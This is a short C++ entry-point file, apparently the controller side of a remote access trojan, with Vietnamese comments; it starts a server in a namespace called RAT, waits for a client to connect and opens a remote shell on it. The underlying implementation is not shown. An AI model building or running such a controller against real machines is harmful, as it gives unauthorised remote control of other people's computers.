#include "server.h"
#include <iostream>

int main() {
    RAT::Server server(RAT::DEFAULT_PORT);

    // Khởi động server
    if (!server.start()) {
        return 1;
    }

    // Chờ client kết nối và khởi động shell
    server.run_shell();
    
    std::cout << "[*] Server da dung.\n";
    return 0;
}